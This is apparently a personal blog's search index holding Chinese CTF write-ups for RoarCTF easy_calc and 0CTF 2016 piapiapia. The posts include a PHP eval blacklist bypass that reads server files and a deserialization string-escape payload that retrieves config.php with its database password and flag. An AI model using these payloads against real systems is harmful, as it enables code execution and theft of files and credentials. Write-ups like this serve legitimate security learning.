<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>buuoj刷题记录2</title>
    <url>/2019/12/26/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/</url>
    <content><![CDATA[<h2 id="Roarctf-easy-calc"><a href="#Roarctf-easy-calc" class="headerlink" title="[Roarctf]easy_calc"></a>[Roarctf]easy_calc</h2><h3 id="0x01-基础"><a href="#0x01-基础" class="headerlink" title="0x01 基础"></a>0x01 基础</h3><p>php内置读取文件内容函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file_get_contents</span><br><span class="line">readfile</span><br><span class="line">file</span><br></pre></td></tr></table></figure>

<p>目录扫描函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scandir</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>字符转换函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hex2bin(&quot;979797&quot;)-&gt;&quot;aaa&quot;</span><br><span class="line">chr(95)-&gt;&quot;a&quot;</span><br></pre></td></tr></table></figure>

<p>输出函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump()</span><br><span class="line">printf()</span><br></pre></td></tr></table></figure>

<p><code>parse_str</code>函数通常被自动应用于<code>get</code>、<code>post</code>请求和<code>cookie</code>中。使用<code>parse_str</code>解析规则绕过waf</p>
<h3 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h3><p>查看源码，发现calc.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="string">'#calc'</span>).submit(<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url:<span class="string">"calc.php?num="</span>+encodeURIComponent($(<span class="string">"#content"</span>).val()),</span><br><span class="line">            type:<span class="string">'GET'</span>,</span><br><span class="line">            success:<span class="function"><span class="keyword">function</span><span class="params">(data)</span></span>&#123;</span><br><span class="line">                $("#result").html(`&lt;div class="alert alert-success"&gt;</span><br><span class="line">            &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125;</span><br><span class="line">            &lt;/div&gt;`);</span><br><span class="line">            &#125;,</span><br><span class="line">            error:<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">                alert(<span class="string">"这啥?算不来!"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>进入calc.php,进行代码审计。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;    </span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);<span class="comment">//如果包含黑名单中的字符，程序退出</span></span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x03-开始操作"><a href="#0x03-开始操作" class="headerlink" title="0x03 开始操作"></a>0x03 开始操作</h3><p>传入<code>1+1</code> 显示<code>403 Forbidden</code> 传入<code>1%2b1</code>就可以。必须传入urldecode后。查看<code>phpinfo()</code>，也是<code>403 Forbidden</code>，利用PHP自动解析函数<code>parser_str()</code>绕过，纤细介绍查看<a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">参考连接</a>。</p>
<p>扫描目录使用<code>scandir()</code>因为<code>/ &#39;  &quot;</code>被过滤无法直接使用<code>/</code>，使用<code>chr()</code>转换payload= <code>?+num=print_r(scandir(chr(47)))</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; .dockerenv [3] &#x3D;&gt; bin [4] &#x3D;&gt; boot [5] &#x3D;&gt; dev [6] &#x3D;&gt; etc [7] &#x3D;&gt; f1agg [8] &#x3D;&gt; home [9] &#x3D;&gt; lib [10] &#x3D;&gt; lib64 [11] &#x3D;&gt; media [12] &#x3D;&gt; mnt [13] &#x3D;&gt; opt [14] &#x3D;&gt; proc [15] &#x3D;&gt; root [16] &#x3D;&gt; run [17] &#x3D;&gt; sbin [18] &#x3D;&gt; srv [19] &#x3D;&gt; start.sh [20] &#x3D;&gt; sys [21] &#x3D;&gt; tmp [22] &#x3D;&gt; usr [23] &#x3D;&gt; var ) 1</span><br></pre></td></tr></table></figure>

<p>使用PHP内置函数获<code>file_get_contents()</code>获取文件内容payload=<code>?+num=printf(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;d09c31b7-d1a1-45a2-b35b-65452a1335ef&#125; 43</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>buuoj</tag>
        <tag>web</tag>
        <tag>Roarctf</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录1</title>
    <url>/2019/12/23/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/</url>
    <content><![CDATA[<h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><h3 id="0x01-基础"><a href="#0x01-基础" class="headerlink" title="0x01 基础"></a>0x01 基础</h3><p>一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者<code>www.zip</code>等一系列文件中出现网站源码。也可以使用工具扫描</p>
<p>PHP序列化<a href="https://www.php.cn/php-notebook-239422.html" target="_blank" rel="noopener">参考文章</a></p>
<a id="more"></a>

<h3 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h3><p>题中<code>www.zip</code>中包含源码，下载<del>后进行代码审计（不会）</del>翻阅PHP手册，各种百度。在config.php中包含flag，要想办法获取到此文件<br>config.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $config[&#39;hostname&#39;] &#x3D; &#39;127.0.0.1&#39;;</span><br><span class="line">    $config[&#39;username&#39;] &#x3D; &#39;root&#39;;</span><br><span class="line">    $config[&#39;password&#39;] &#x3D; &#39;&#39;;</span><br><span class="line">    $config[&#39;database&#39;] &#x3D; &#39;&#39;;</span><br><span class="line">    $flag &#x3D; &#39;&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>查看index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($user-&gt;login($username, $password)) &#123;</span><br><span class="line">			$_SESSION[<span class="string">'username'</span>] = $username;</span><br><span class="line">			header(<span class="string">'Location: profile.php'</span>);<span class="comment">//登入后跳转到profile.php</span></span><br><span class="line">			<span class="keyword">exit</span>;	</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>查看profile.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Login First'</span>);</span><br><span class="line">&#125;   </span><br><span class="line">$username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">$profile=$user-&gt;show_profile($username);</span><br><span class="line"><span class="keyword">if</span>($profile  == <span class="keyword">null</span>) &#123; </span><br><span class="line">    header(<span class="string">'Location: update.php'</span>); <span class="comment">//$profile为空，跳转到update.php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line">    $profile = unserialize($profile); <span class="comment">//一般看见unserialize()会考虑反序列化漏洞，</span></span><br><span class="line">    $phone = $profile[<span class="string">'phone'</span>]; </span><br><span class="line">    $email = $profile[<span class="string">'email'</span>]; </span><br><span class="line">    $nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">    $photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));<span class="comment">//file_get_contents()此函数可以获得文件内容</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>update.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'phone'</span>] &amp;&amp; $_POST[<span class="string">'email'</span>] &amp;&amp; $_POST[<span class="string">'nickname'</span>] &amp;&amp; $_FILES[<span class="string">'photo'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">    $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, $_POST[<span class="string">'phone'</span>]))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class="string">'email'</span>]))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Invalid email'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line">    $file = $_FILES[<span class="string">'photo'</span>];</span><br><span class="line">    <span class="keyword">if</span>($file[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line">    move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">    $profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">    $profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">    $profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">    $profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">    $user-&gt;update_profile($username, serialize($profile));<span class="comment">//将$profile序列化，执行过滤函数</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看update_profile()函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">    $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">    $new_profile = <span class="keyword">parent</span>::filter($new_profile); </span><br><span class="line">    $where = <span class="string">"username = '$username'"</span>; </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看filter()函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">    $escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>); </span><br><span class="line">    $escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>; </span><br><span class="line">    $string = preg_replace($escape, <span class="string">'_'</span>, $string); <span class="comment">//将  “ ‘ ”、 “\\\\” 替换成 “_” </span></span><br><span class="line">    $safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">    $safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string); <span class="comment">//将“ select|insert|update|delete|where” 替换成 "hacker"，返回替换后的字符串</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在update_profile()，返回到profile.php.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$profile = unserialize($profile); <span class="comment">//反序列化$profile</span></span><br><span class="line">    $phone = $profile[<span class="string">'phone'</span>]; </span><br><span class="line">    $email = $profile[<span class="string">'email'</span>]; </span><br><span class="line">    $nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">    $photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br></pre></td></tr></table></figure>

<p>序列化后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$profile&#x3D;a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:8:&quot;12@12.12&quot;;s:8:&quot;nickname&quot;;s:4:&quot;1234&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;d41d8cd98f00b204e9800998ecf8427e&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>要让$photo得到的文件是config.php也就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;d41d8cd98f00b204e9800998ecf8427e&quot;;</span><br></pre></td></tr></table></figure>
<p>变成 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;</span><br></pre></td></tr></table></figure>
<p>序列化后的长度是固定的，但是在经过过滤函数时候，nickname传入where会被替换成hacker,多出一个字符，这样就可以修改反序列化后的photo所对应的文件，使其为config.php。</p>
<p>因为nickname有长度限制使用数组可以绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br></pre></td></tr></table></figure>
<p>让nickname的值为<code>&quot;};s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>长度为34,传入34个where</p>
<h3 id="0x03-开始操作"><a href="#0x03-开始操作" class="headerlink" title="0x03 开始操作"></a>0x03 开始操作</h3><p><img src="/images/1.png" alt="1"> 传入参数</p>
<p>访问profile.php</p>
<p><img src="/images/2.png" alt="2"></p>
<p>将base64解码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span><br><span class="line">$config[<span class="string">'password'</span>] = <span class="string">'qwertyuiop'</span>;</span><br><span class="line">$config[<span class="string">'database'</span>] = <span class="string">'challenges'</span>;</span><br><span class="line">$flag = <span class="string">'flag&#123;94b7c4b2-866d-4189-9b0a-abdf22990071&#125;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>buuoj</tag>
        <tag>web</tag>
        <tag>0CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2019/12/19/hello-world/</url>
    <content><![CDATA[<p>第一次弄好自己的博客，之前都是在onenote上写的，现在准备慢慢向博客转移</p>
]]></content>
  </entry>
</search>
